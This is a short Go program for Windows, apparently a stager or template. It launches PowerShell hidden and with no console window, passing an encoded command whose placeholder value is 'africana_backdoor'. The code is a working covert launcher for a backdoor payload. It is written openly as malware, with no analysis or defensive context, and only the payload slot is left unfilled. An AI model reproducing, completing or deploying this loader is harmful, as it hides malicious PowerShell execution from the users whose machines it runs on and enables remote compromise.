package main

import (
    "syscall"
    "unsafe"
)

func main() {
    var procInfo syscall.ProcessInformation
    startupInfo := syscall.StartupInfo{Cb: uint32(unsafe.Sizeof(syscall.StartupInfo{}))}

    encodedCommand := "africana_backdoor"

    cmd := "powershell.exe -WindowStyle Hidden -Enc " + encodedCommand
    commandLine, _ := syscall.UTF16PtrFromString(cmd)

    syscall.CreateProcess(
        nil,
        commandLine,
        nil,
        nil,
        false,
        0x08000000,
        nil,
        nil,
        &startupInfo,
        &procInfo,
    )

    syscall.CloseHandle(procInfo.Process)
    syscall.CloseHandle(procInfo.Thread)
}
